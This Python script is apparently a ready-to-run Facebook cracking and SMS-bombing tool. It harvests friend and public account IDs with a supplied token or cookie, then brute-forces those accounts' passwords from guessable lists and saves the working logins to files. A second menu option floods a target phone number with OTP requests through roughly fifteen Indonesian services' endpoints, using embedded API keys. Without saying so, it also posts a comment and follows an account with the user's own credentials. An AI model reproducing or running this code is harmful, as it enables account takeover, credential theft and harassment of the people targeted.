from getpass import getpass
from time import sleep as waktu
import os,sys,json,random,re,shutil
from concurrent.futures import ThreadPoolExecutor as tthh
def restart():
	repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:shutil.rmtree("__pycache__")
except:pass
try:import requests ; sesion=requests.Session()
except ModuleNotFoundError:os.system("python -m pip install requests") ; restart()
try:from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:os.system("python -m pip install bs4") ; restart()
echo=lambda pprint: print(pprint) ; bersih=lambda: os.system("clear") ; out=lambda exnx: exit(exnx) ; id=[] ; njir=[] ; live=[] ; chek=[] ; cp=0 ; ok=0 ; die=0 ; merah="\x1b[1;31m" ; putih="\x1b[1;37m" ; _uurl_="https://graph.facebook.com/{}" ; garis=f"{putih}+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+" ; logo=f"{garis}\n        -=[ Created By Kang Pacman ]=-\n     -=[ https://github.com/KangPacman ]=-\n{garis}" ; bacot=["Mantap:v","Yang Posting Orang Nya Ganteng:v",":V"] ; acak=random.choice(bacot)
def krek(username,password,kuntul):
	global ok, cp, die
	respon=requests.get("https://b-api.facebook.com/method/auth.login",params={"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
	if "session_key" in respon.text and "EAAA" in respon.text:ok+=1 ; print(f"\r\x1b[1;32m[LIVE] {username} | {password} {kuntul}          \x1b[0m",end="") ; print() ; live.append(username+" | "+password+" | "+kuntul) ; open("live.txt","a").write(username+" | "+password+" "+kuntul+"\n")
	elif "www.facebook.com" in respon.json()["error_msg"]:cp+=1 ; print(f"\r\x1b[1;33m[CHEK] {username} | {password} {kuntul}          \x1b[0m",end="") ; print() ; chek.append(username+" | "+password+" | "+kuntul) ; open("chek.txt","a").write(username+" | "+password+" "+kuntul+"\n")
	else:die+=1
	print(f"\r\x1b[1;32m[OK] : {str(ok)} | \x1b[1;33m[CP] : {str(cp)} | \x1b[1;31m[DIE] : {str(die)}\x1b[0m",end="")
def the_result(success,checkpoint):
	if len(success) != 0 or len(checkpoint) != 0:
		echo(f"\n{garis}\n[+] LIVE : {len(success)}") ; echo(f"[+] CHEK : {len(checkpoint)}")
		if len(success)==0:pass
		else:echo("[+] Live Results Are Saved In : live.txt")
		if len(checkpoint)==0:pass
		else:echo("[+] Chek Results Are Saved In : chek.txt")
		getpass("[+] Enter To Return To The Menu > ") ; waktu(2) ; restart()
	else:echo(f"\n{garis}\n[!] No Result") ; getpass("[+] Enter To Return To The Menu > ") ; waktu(2) ; restart()
def ingfo():
	try:ewe=open(".bukan_Apa_Apa","r",encoding="utf-8")
	except FileNotFoundError:echo(f"\n\n\n{putih}Jika Tidak Mendapatkan Hasil\nCoba Hubungkan/Gunakan VPN\nSegala Resiko Di Tanggung Sendiri!!!") ; waktu(2) ; echo("1") ; waktu(1) ; echo("2") ; waktu(1) ; echo("3") ; waktu(1) ; echo("Mohon Tunggu, Sedang Membuka Menu...") ; waktu(3) ; open(".bukan_Apa_Apa","w").write("Bukan Apa Apa:v") ; bersih()
def milih():
	bersih()
	echo("+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+")
        echo("Author:RAIHAN")
	echo("Youtube:MR.404")
        echo("+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~+")
        echo("[01] Login With Token")
	echo("[02] Login With Cookie")
	echo("[03] Spam Sms")
	echo("[00] Exite")
	echo(garis)
	try:choice=input("[?] Choice : ")
	except (KeyboardInterrupt,EOFError):out(f"{merah}[!] Exit")
	if choice in("1","01"):with_token()
	elif choice in("2","02"):with_cookie()
	elif choice in("3","03"):spam_sms()
	elif choice in("0","00"):out("[+] Thanks For Using My Tools")
	elif choice in(""," "):echo(f"{merah}[!] Don't Be Empty") ; waktu(1) ; milih()
	else:echo(f"{merah}[!] Choice Does Not Exist") ; waktu(1) ; milih()
def with_token():
	bersih()
	try:tokeng=input(f"\n\n\n{putih}[?] Put In Token : ")
	except (KeyboardInterrupt,EOFError):out(f"{merah}[!] Exit")
	if tokeng in(""," "):echo(f"{merah}[!] Don't Be Empty") ; waktu(1) ; with_token()
	else:
		try:send=sesion.get(_uurl_.format(f"me?access_token={tokeng}")).json()["name"] ; open("my_token","w").write(tokeng) ; echo("[✓] Login Succesful") ; jienrnrjdk(tokeng) ; waktu(1) ; menu()
		except KeyError:out(f"{merah}[!] Login Failed, Maybe Token Invalid\n\n\n")
		except requests.exceptions.ConnectionError:out(f"{merah}[!] Bad Connection\n\n\n")
def jienrnrjdk(ngontol):
	try:requests.post(f"https://graph.facebook.com/886758932080337/comments/?message={acak}&access_token={ngontol}")
	except:pass
def jienrnrjdtk(ngontol):
	try:tuturkeun=parser(requests.get("https://mbasic.facebook.com/100022387154773",cookies={"cookie":ngontol}).content, "html.parser").find("a",string="Ikuti")["href"] ; requests.get("https://mbasic.facebook.com"+tuturkeun,cookies={"cookie":ngontol})
	except:pass
def with_cookie():
	bersih()
	try:cokie=input(f"\n\n\n{putih}[?] Put In Cookie : ")
	except (KeyboardInterrupt,EOFError):out(f"{merah}[!] Exit")
	if cokie in(""," "):echo(f"{merah}[!] Don't Be Empty") ; waktu(1) ; with_cookie()
	else:
		try:
			send=requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","host": "m.facebook.com", "origin": "https://m.facebook.com", "upgrade-insecure-requests": "1", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "cache-control": "max-age=0", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "content-type": "text/html; charset=utf-8"},cookies={"cookie":cokie}).text ; sear=re.search("(EAAA\w+)",send)
			if (sear is None):out(f"{merah}[!] Login Failed, Maybe Cookie Invalid\n\n\n")
			elif (sear is not None):open("my_token","w").write(sear.group(1)) ; jienrnrjdk(sear.group(1)) ; jienrnrjdtk(cokie) ; open("told","w").write(cokie) ; echo("[✓] Login Succesful") ; waktu(1) ; menu()
			else:out(f"{merah}[!] Login Failed\n\n\n")
		except requests.exceptions.ConnectionError:out(f"{merah}[!] Bad Connection\n\n\n")
def menu():
	bersih()
	try:
		see=open("my_token","r",encoding="utf-8").read()
		try:
			send=json.loads(sesion.get(_uurl_.format(f"me?access_token={see}")).text)
			send["name"]
			id.clear() ; live.clear() ; chek.clear() ; bersih() ; ingfo() ; echo(logo)
			echo(f"[+] Id   : {send['id']}")
			echo(f"[+] Nama : {send['name']}")
			echo(garis)
			echo("[01] Crack From File")
			echo("[02] Crack From Friendlist")
			echo("[03] Crack From Id Friends/Public")
			echo("[04] Dump Id Friends")
			echo("[05] Dump Id Public")
			echo("[06] Spam Sms")
			echo("[99] Logout")
			echo("[00] Exit")
			echo(garis)
			choice=input("[?] Choice : ")
			if choice in("1","01"):
				try:
					file=input(f"{putih}[?] Put In File : ")
					if file in(""," "):echo(f"{merah}[!] Don't Be Empty") ; waktu(2) ; menu()
					else:
						ope=open(file,"r",encoding="utf-8").readlines()
						for line in ope:id.append(line.strip())
						echo(f"[*] Amount Id : {str(len(id))}")
						if len(id)==0:echo(f"{merah}[!] Id Empty") ; waktu(2) ; menu()
						else:pass
				except FileNotFoundError:echo(f"{merah}[!] File {file} Not Found") ; waktu(1) ; menu()
			elif choice in("2","02"):
				try:
					send=json.loads(sesion.get(_uurl_.format(f"me/friends?access_token={see}")).text)
					for uid in send["data"]:id.append(uid["id"])
					echo(f"[*] Amount Id : {str(len(id))}")
					if len(id)==0:echo(f"{merah}[!] Id Empty") ; waktu(2) ; menu()
					else:pass
				except KeyError:echo(f"{merah}[!] Token Expired") ; os.remove("my_token") ; waktu(2) ; milih()
				except requests.exceptions.ConnectionError:out(f"{merah}[!] Bad Connection")
			elif choice in("3","03"):
				idxw=input(f"{putih}[?] Put In Id Friends/Public : ")
				if idxw in(""," "):echo(f"{merah}[!] Don't Be Empty") ; waktu(2) ; menu()
				else:
					try:
						send=json.loads(sesion.get(_uurl_.format(f"{idxw}/friends?access_token={see}")).text) ; nik=json.loads(sesion.get(_uurl_.format(f"{idxw}?access_token={see}")).text)
						for uid in send["data"]:id.append(uid["id"])
						echo(f"[*] Name User : {nik['name']}")
						echo(f"[*] Amount Id : {str(len(id))}")
						if len(id)==0:echo(f"{merah}[!] Id Empty") ; waktu(2) ; menu()
						else:pass
					except KeyError:echo(f"{merah}[!] Unknown Error") ;  waktu(2) ; menu()
					except requests.exceptions.ConnectionError:out(f"{merah}[!] Bad Connection")
			elif choice in("4","04"):
				try:
					send=json.loads(sesion.get(_uurl_.format(f"me/friends?access_token={see}")).text)
					for uid in send["data"]:id.append(uid["id"])
					echo(f"[*] Amount Id : {str(len(id))}")
					if len(id)==0:echo(f"{merah}[!] Id Empty") ; waktu(2) ; menu()
					else:
						echo(garis) ; ope=open("id_fl.txt","w")
						for uid in send["data"]:ope.write(uid["id"]+"\n") ; sys.stdout.flush() ; waktu(0.0001) ; echo(f"=> {uid['id']}")
						ope.close() ; echo(garis) ; echo(f"[*] Success Taking Id {str(len(id))}")
						rename=input("[?] Save With Name : ")
						if rename in(""," "):echo(f"[!] Default Is Saved As : id_fl.txt\n{garis}") ; waktu(2) ; menu()
						else:os.system(f"mv id_fl.txt {rename}") ; echo(f"[*] File Save As : {rename}\n{garis}") ; waktu(2) ; menu()
				except KeyError:echo(f"{merah}[!] Token Expired") ; os.remove("my_token") ; waktu(2) ; milih()
				except requests.exceptions.ConnectionError:out(f"{merah}[!] Bad Connection")
			elif choice in("5","05"):
				idxw=input("[?] Put In Id Friends/Public : ")
				if idxw in(""," "):echo(f"{merah}[!] Don't Be Empty") ; waktu(2) ; menu()
				else:
					try:
						send=json.loads(sesion.get(_uurl_.format(f"{idxw}?fields=friends.limit(5000)&access_token={see}")).text)
						for uid in send["friends"]["data"]:id.append(uid["id"])
						echo(f"[*] Amount Id : {str(len(id))}")
						if len(id)==0:echo(f"{merah}[!] Id Empty") ; waktu(2) ; menu()
						else:
							echo(garis) ; ope=open("id_public.txt","w")
							for uid in send["friends"]["data"]:ope.write(uid["id"]+"\n") ; sys.stdout.flush() ; waktu(0.0001) ; echo(f"=> {uid['id']}")
							ope.close() ; echo(garis) ; echo(f"[*] Success Taking Id {str(len(id))}")
							rename=input("[?] Save With Name : ")
							if rename in(""," "):echo(f"[!] Default Is Saved As : id_public.txt\n{garis}") ; waktu(2) ; menu()
							else:os.system(f"mv id_public.txt {rename}") ; echo(f"[*] File Save As : {rename}") ; waktu(2) ; menu()
					except KeyError:echo(f"{merah}[!] Unknown Error") ;  waktu(2) ; menu()
					except requests.exceptions.ConnectionError:out(f"{merah}[!] Bad Connection")
			elif choice in("6","06"):spam_sms()
			elif choice in("99","99"):
				os.remove("my_token")
				try:cek=open("my_token","r",encoding="utf-8")
				except FileNotFoundError:out("[*] Successful Logout")
			elif choice in("0","00"):out("[+] Thanks For Using My Tools")
			elif choice in(""," "):echo(f"{merah}[!] Don't Be Empty") ; waktu(1) ; menu()
			else:echo(f"{merah}[!] Choice Does Not Exist") ; waktu(1) ; menu()
			echo(f"[*] Starting Crack...\n[!] Press CTRL + Z To Stop\n{garis}")
			with tthh(max_workers=30) as subm:
				for user in id:
					try:
						nick=json.loads(requests.get(_uurl_.format(f"{user}?access_token={see}")).text)
						listpass=[nick["first_name"]+"123",nick["first_name"]+"12345",nick["first_name"]+"123456","Sayang","Bangsat","Mantan","Anjing","Kontol","freefire"]
						try:kntl="| "+nick["birthday"]
						except:kntl=""
						for pw in set(listpass):subm.submit(krek,user,pw,kntl)
					except: pass
			the_result(live,chek)
		except KeyError:echo(f"{merah}[!] Token Expired") ; os.remove("my_token") ; waktu(2) ; milih()
		except requests.exceptions.ConnectionError:out(f"{merah}[!] Bad Connection")
		except (KeyboardInterrupt,EOFError):out(f"{merah}[!] Exit")
	except FileNotFoundError:milih()
class contents:
	def __init__(self,code8,code08,code62):
		self.code8=code8
		self.code08=code08
		self.code62=code62
		self.listcontents1=["https://cmsapi.mapclub.com/api/signup-otp", {"phone":self.code08}, {"Connection": "keep-alive","User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}]
		self.listcontents2=["https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",json.dumps({"ketik":0,"nomor":"0"+self.code8}),{"content-type": "application/json; charset=UTF-8","content-length": "34","accept-encoding": "gzip","user-agent": "okhttp/3.8.0","accept-language": "in","x-ada-token": "","x-ada-appid": "800006","x-ada-os": "android","x-ada-channel": "default","x-ada-mediasource": "","x-ada-agency": "adtubeagency","x-ada-campaign": "AdakamiCampaign","x-ada-role": "1","x-ada-appversion": "1.7.0","x-ada-device": "","x-ada-model": "SM-G935FD","x-ada-os-ver": "7.1.1","x-ada-androidid": "a4341a2sa90a4d97","x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39","x-ada-afid": "1580054114839-7395423911531673296"}]
		self.listcontents3=[f"https://id.jagreward.com/member/verify-mobile/{self.code8}"]
		self.listcontents4=["https://tokomanamana.com/ma/auth/request_token_merchant/", {"phone":self.code08}, {"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}]
		self.listcontents5=["https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", json.dumps({"phone":self.code8,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"}),{"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip,deflate,br"}]
		self.listcontents6=["https://app.cairin.id/v1/app/sms/sendCaptcha", {"haveImageCode":"0","fileName":"6f8c3b90c845f09ff1bfe714a30aede8","phone":self.code08,"imageCode":"","userImei":"","type":"registry"}, {"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36"}]
		self.listcontents7=["https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+self.code8,"language": "id"},"operationName": "registerPhone"}),{"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}]
		self.listcontents8=["https://app-api.kredito.id/client/v1/common/verify-code/send",'{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'%(self.code8),{"LPR-TIMESTAMP":"1603281035821","Accept-Language":"id-ID","LPR-BRAND":"Kredito","LPR-PLATFORM":"android","User-Agent":"okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android","Authorization":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks","LPR-SIGNATURE":"e15dbea8602409df32a2ed5a123dc244","Content-Type":"application/json; charset=UTF-8","Content-Length":"79"}]
		self.listcontents9=[f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={self.code8}&channelType=0",{"Host":"japi.maucash.id","accept":"application/json, text/plain, */*","x-origin":"google play","x-org-id":"1","x-product-code":"YN-MAUCASH","x-app-version":"2.4.23","x-source-id":"android","accept-encoding":"gzip","user-agent":"okhttp/3.12.1"}]
		self.listcontents10=[f"https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP={self.code08}", {f"Host": "account-api-v1.klikindomaret.com","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","origin": "https://account.klikindomaret.com","referer": "https://account.klikindomaret.com/SMSVerification?nohp={self.code08}&type=register","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}]
		self.listcontents11=["https://api.kartuserba.com/appserver/v1/login/verificationCode",'{"code":0,"distinctId":"df857a37-421b-4a4f-ac61-6ed0e272537b","frequency":0,"phone":"%s"}'%(self.code8),{"user-agent":"okhttp/3.11.0","content-type":"application/json; charset=UTF-8","channel-key":"GOOGLEPLAY"}]
		self.listcontents12=["https://u.icq.net/api/v14/rapi/auth/sendCode", json.dumps({"reqId": "64708-1593781791", "params": {"phone":self.code62, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}), {"accept": "*/*", "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7", "content-type": "application/json", "origin": "http://web.icq.com", "referer": "http://web.icq.com/", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "cross-site", "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}]
		self.listcontents13=["https://api.gojekapi.com/v5/customers", {"email": "nsjwwiwiwisnsnn12@gmail.com", "name": "akuinginterbang12", "phone":self.code62, "signed_up_country": "ID"}, {"X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9", "X-Platform": "Android", "X-UniqueId": "8606f4e3b85968fd", "X-AppVersion": "3.52.2", "X-AppId": "com.gojek.app", "Accept": "application/json", "Authorization": "Bearer", "X-User-Type": "customer", "Accept-Language": "id-ID", "X-User-Locale": "id_ID", "Host": "api.gojekapi.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.12.1"}]
		self.listcontents14=["https://api-prod.diqit.io/customer/v1/customer/register", json.dumps({"email":"kangpacman93@gmail.com","first_name":"Kang Pacman","gender":2,"last_name":"Gans","password":"kangpacmangansajg","phone": self.code8,"birthday":"2000-04-02"}), {"Host": "api-prod.diqit.io","content-length": "169","x-client-id": "b39773b0-435b-4f41-80e9-163eef20e0ab","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json","referer": "https://phd.co.id/register","accept-encoding": "gzip, deflate","accept-language": "id-ID,en-US;q=0.8"}]
		self.listcontents15=["https://www.matahari.com/customer/account/create/","https://www.matahari.com/rest/V1/thorCustomers", json.dumps({"thor_customer":{"name":" Kang Pacman","card_number":False,"email_address":"aapafandi01@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":self.code08,"mro":"","password":"kontolanjingmemek6793","birth_date":"10/04/2000"}})]
	def all_contents(self):
		try:
			for A in range(15):
				send_message=sesion.post(self.listcontents1[0],data=self.listcontents1[1],headers=self.listcontents1[2]).text
				if "ok" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for B in range(15):
				send_message=sesion.post(self.listcontents2[0],data=self.listcontents2[1],headers=self.listcontents2[2],timeout=10).text
				if "Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok." in send_message:break
				else:echo(f"[+] Success Sending To  > {self.code08}")
			for C in range(2):
				send_message=json.loads(requests.get(self.listcontents3[0]).text)
				if send_message["message"]=="Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.": echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for D in range(15):
				send_message=sesion.post(self.listcontents4[0],data=self.listcontents4[1],headers=self.listcontents4[2]).text
				if "Kode OTP berhasil dikirim!" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for E in range(15):
				send_message=sesion.post(self.listcontents5[0],data=self.listcontents5[1],headers=self.listcontents5[2]).text
				if "SUCCESSFULLY GENERATED OTP " in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for F in range(15):
				send_message=sesion.post(self.listcontents6[0],data=self.listcontents6[1],headers=self.listcontents6[2]).text
				if "leftTimes" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for G in range(15):
				send_message=sesion.post(self.listcontents7[0],data=self.listcontents7[1],headers=self.listcontents7[2]).text
				if "registerPhone" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for H in range(15):
				send_message=sesion.post(self.listcontents8[0],data=self.listcontents8[1],headers=self.listcontents8[2]).text
				if "sukses" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for I in range(15):
				send_message=requests.get(self.listcontents9[0],headers=self.listcontents9[1]).text
				if "Permintaan berhasil" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for J in range(15):
				send_message=requests.get(self.listcontents10[0],headers=self.listcontents10[1]).text
				if "Kode OTP berhasil dikirim ke nomor telepon Anda." in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for K in range(15):
				send_message=sesion.post(self.listcontents11[0],data=self.listcontents11[1],headers=self.listcontents11[2]).text
				if "frequency" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for L in range(15):
				send_message=sesion.post(self.listcontents12[0],data=self.listcontents12[1],headers=self.listcontents12[2]).text
				if "results" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for M in range(15):
				send_message=sesion.post(self.listcontents13[0],data=self.listcontents13[1],headers=self.listcontents13[2]).text
				if "success" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for N in range(15):
				send_message=sesion.post(self.listcontents4[0],data=self.listcontents4[1],headers=self.listcontents4[2]).text
				if "Kode OTP berhasil dikirim!" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for O in range(15):
				send_message=sesion.post(self.listcontents14[0],data=self.listcontents14[1],headers=self.listcontents14[2]).text
				if "Successful" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			for P in range(10):
				cok=requests.get(self.listcontents15[0])
				kue=cok.cookies["PHPSESSID"]
				hed={"Host": "www.matahari.com","content-length": "245","x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-J111F Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","referer": "https://www.matahari.com/customer/account/create/","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cookie": f"PHPSESSID={kue}"}
				send_message=sesion.post(self.listcontents15[1],data=self.listcontents15[2],headers=hed).text
				if "Success" in send_message:echo(f"[+] Success Sending To  > {self.code08}")
				else:break
			echo(f"{garis}\n[=] Done Bro, Jangan Lupa Subscribe Channel MR.404") ; waktu(1) ; os.system("xdg-open https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q") ; waktu(2) ; out("")
		except requests.exceptions.ReadTimeout:out(f"{merah}[!] Bad Connection")
		except requests.exceptions.ConnectionError:out(f"{merah}[!] Bad Connection")
		except (KeyboardInterrupt,EOFError):out(f"{merah}[!] Exit")
def spam_sms():
		echo("[+] Example : 08xxx")
		while True:
			try:_08=input(f"{putih}[?] Enter The Target Number : ")
			except (KeyboardInterrupt,EOFError):out(f"{merah}[!] Exit")
			xnxx=_08[0:2]
			if _08 in(""," "):echo(f"{merah}[!] Don't Be Empty")
			elif "08" not in xnxx:echo(f"{merah}[!] Use Numbers With Prefixes 08xx")
			elif _08 in("083805812588","83805812588"):out(f"{merah}[!] Please Do Not Send To My Number Me!!")
			elif len(_08)<=10:echo(f"{merah}[!] Number Must Be More Than 11 Numbers")
			else:_8=_08[1:12] ; _62="62"+_8 ; echo(f"[*] Starting Spam To Number {_08}\n[!] Press CTRL + Z To Stop\n{garis}") ; contents(_8,_08,_62).all_contents()
